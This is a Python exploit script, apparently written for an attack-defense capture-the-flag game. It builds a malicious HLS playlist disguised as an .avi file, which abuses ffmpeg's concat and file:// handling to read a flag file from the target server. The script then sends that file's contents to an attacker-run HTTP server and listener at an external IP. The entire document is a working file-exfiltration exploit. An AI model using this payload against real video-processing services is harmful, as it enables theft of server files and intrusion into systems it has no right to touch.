#!/usr/bin/env python3
import os
import sys
import time
from subprocess import Popen, PIPE, STDOUT

from send_payload import send_payload
from server import listen_flag

print("Need external ip address to sploit this")
EXTERNAL_IP = sys.argv[1]
FLAG_ID = sys.argv[2]
HOST = sys.argv[3]
TOKEN = sys.argv[4]
PORT = 8900

def setup_static():
    header_data = f"""#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://{EXTERNAL_IP}:12345?"""
    with open('static/hdr.m3u8', 'w') as f:
        f.write(header_data)
    p = os.popen('cd static && python3 -m http.server 12322 --bind 0.0.0.0')


def gen_payload():
    test_avi_data = f"""#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://{EXTERNAL_IP}:12322/hdr.m3u8|file:///vault/books/{FLAG_ID}.txt
#EXT-X-ENDLIST"""
    with open('test.avi', 'w') as f:
        f.write(test_avi_data)


if __name__ == '__main__':
    #f = open("log.log", "w")
    setup_static()
    gen_payload()
    # listen_flag_thread = listen_flag()
    p = Popen(['python3', 'server.py'], stdout=PIPE, stderr=STDOUT)
    #output = Popen(['python3', 'server.py'], stdout=f, stderr=f)
    time.sleep(2)
    send_payload(HOST, PORT, TOKEN)
    time.sleep(2)
    for line in iter(p.stdout.readline, ''):
        print(line)
        sys.stdout.flush()
    #listen_flag_thread.start()
    #response = output.communicate()
    #print(response)
